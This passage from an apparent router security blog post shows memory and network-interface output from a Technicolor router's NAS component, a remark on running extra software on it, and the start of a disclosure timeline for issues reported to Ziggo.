+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 37</span><span style="color:#999;font-style:italic"># MemFree:           94916 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 38</span><span style="color:#999;font-style:italic"># Buffers:             304 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 39</span><span style="color:#999;font-style:italic"># Cached:             6232 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 40</span><span style="color:#999;font-style:italic"># SwapCached:            0 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 41</span><span style="color:#999;font-style:italic"># Active:            16596 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 42</span><span style="color:#999;font-style:italic"># Inactive:           2584 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 43</span><span style="color:#999;font-style:italic"># Active(anon):      12916 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 44</span><span style="color:#999;font-style:italic"># Inactive(anon):        0 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 45</span><span style="color:#999;font-style:italic"># Active(file):       3680 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 46</span><span style="color:#999;font-style:italic"># Inactive(file):     2584 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 47</span><span style="color:#999;font-style:italic"># HighTotal:             0 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 48</span><span style="color:#999;font-style:italic"># HighFree:              0 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 49</span><span style="color:#999;font-style:italic"># LowTotal:         124304 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 50</span><span style="color:#999;font-style:italic"># LowFree:           94916 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 51</span><span style="color:#999;font-style:italic"># SwapTotal:             0 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 52</span><span style="color:#999;font-style:italic"># SwapFree:              0 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 53</span><span style="color:#999;font-style:italic"># Dirty:                 0 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 54</span><span style="color:#999;font-style:italic"># Writeback:             0 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 55</span><span style="color:#999;font-style:italic"># AnonPages:         12664 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 56</span><span style="color:#999;font-style:italic"># Mapped:             4056 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 57</span><span style="color:#999;font-style:italic"># Slab:               7764 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 58</span><span style="color:#999;font-style:italic"># SReclaimable:       2860 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 59</span><span style="color:#999;font-style:italic"># SUnreclaim:         4904 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 60</span><span style="color:#999;font-style:italic"># PageTables:          248 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 61</span><span style="color:#999;font-style:italic"># NFS_Unstable:          0 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 62</span><span style="color:#999;font-style:italic"># Bounce:                0 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 63</span><span style="color:#999;font-style:italic"># WritebackTmp:          0 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 64</span><span style="color:#999;font-style:italic"># CommitLimit:       62152 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 65</span><span style="color:#999;font-style:italic"># Committed_AS:      16136 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 66</span><span style="color:#999;font-style:italic"># VmallocTotal:    1015800 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 67</span><span style="color:#999;font-style:italic"># VmallocUsed:        1484 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 68</span><span style="color:#999;font-style:italic"># VmallocChunk:    1013560 kB</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 69</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 70</span>ifconfig -a
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 71</span><span style="color:#999;font-style:italic"># eth0      Link encap:Ethernet  HWaddr 08:95:2A:80:24:67</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 72</span><span style="color:#999;font-style:italic">#           inet addr:192.168.178.10  Bcast:192.168.178.255  Mask:255.255.255.0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 73</span><span style="color:#999;font-style:italic">#           inet6 addr: fe80::a95:2aff:fe80:2467/64 Scope:Link</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 74</span><span style="color:#999;font-style:italic">#           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 75</span><span style="color:#999;font-style:italic">#           RX packets:4542 errors:0 dropped:0 overruns:0 frame:0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 76</span><span style="color:#999;font-style:italic">#           TX packets:4869 errors:0 dropped:0 overruns:0 carrier:0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 77</span><span style="color:#999;font-style:italic">#           collisions:0 txqueuelen:1000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 78</span><span style="color:#999;font-style:italic">#           RX bytes:387893 (378.8 KiB)  TX bytes:838039 (818.3 KiB)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 79</span><span style="color:#999;font-style:italic">#</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 80</span><span style="color:#999;font-style:italic"># ifb0      Link encap:Ethernet  HWaddr 62:38:09:11:E8:0A</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 81</span><span style="color:#999;font-style:italic">#           BROADCAST NOARP  MTU:1500  Metric:1</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 82</span><span style="color:#999;font-style:italic">#           RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 83</span><span style="color:#999;font-style:italic">#           TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 84</span><span style="color:#999;font-style:italic">#           collisions:0 txqueuelen:32</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 85</span><span style="color:#999;font-style:italic">#           RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 86</span><span style="color:#999;font-style:italic">#</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 87</span><span style="color:#999;font-style:italic"># ifb1      Link encap:Ethernet  HWaddr 2A:1B:73:B3:FF:12</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 88</span><span style="color:#999;font-style:italic">#           BROADCAST NOARP  MTU:1500  Metric:1</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 89</span><span style="color:#999;font-style:italic">#           RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 90</span><span style="color:#999;font-style:italic">#           TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 91</span><span style="color:#999;font-style:italic">#           collisions:0 txqueuelen:32</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 92</span><span style="color:#999;font-style:italic">#           RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 93</span><span style="color:#999;font-style:italic">#</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 94</span><span style="color:#999;font-style:italic"># lo        Link encap:Local Loopback</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 95</span><span style="color:#999;font-style:italic">#           inet addr:127.0.0.1  Mask:255.0.0.0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 96</span><span style="color:#999;font-style:italic">#           inet6 addr: ::1/128 Scope:Host</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 97</span><span style="color:#999;font-style:italic">#           UP LOOPBACK RUNNING  MTU:16436  Metric:1</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 98</span><span style="color:#999;font-style:italic">#           RX packets:3 errors:0 dropped:0 overruns:0 frame:0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 99</span><span style="color:#999;font-style:italic">#           TX packets:3 errors:0 dropped:0 overruns:0 carrier:0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">100</span><span style="color:#999;font-style:italic">#           collisions:0 txqueuelen:0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">101</span><span style="color:#999;font-style:italic">#           RX bytes:114 (114.0 B)  TX bytes:114 (114.0 B)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">102</span><span style="color:#999;font-style:italic">#</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">103</span><span style="color:#999;font-style:italic"># sit0      Link encap:IPv6-in-IPv4</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">104</span><span style="color:#999;font-style:italic">#           NOARP  MTU:1480  Metric:1</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">105</span><span style="color:#999;font-style:italic">#           RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">106</span><span style="color:#999;font-style:italic">#           TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">107</span><span style="color:#999;font-style:italic">#           collisions:0 txqueuelen:0</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">108</span><span style="color:#999;font-style:italic">#           RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span>
+</code></pre></div><p>I was quite suprised at the specifications of the NAS part of the router. With the CPU it boasts amount of available memory and storage, there is the possibility to run some more software on it (e.g. VPN, Torrent, etc.) If one is wiling to <a href="https://github.com/tch-opensrc/" title="Technicolor open source repository for TC7210/TC7230 models">cross-compile</a> them.</p>
 <p>Hope this has been interesting and insightful!</p><h3 id="disclosure-timeline">Disclosure Timeline</h3>
           <ul><li>
         2016-12-02:&nbsp;First reported issues to Ziggo</li><li>
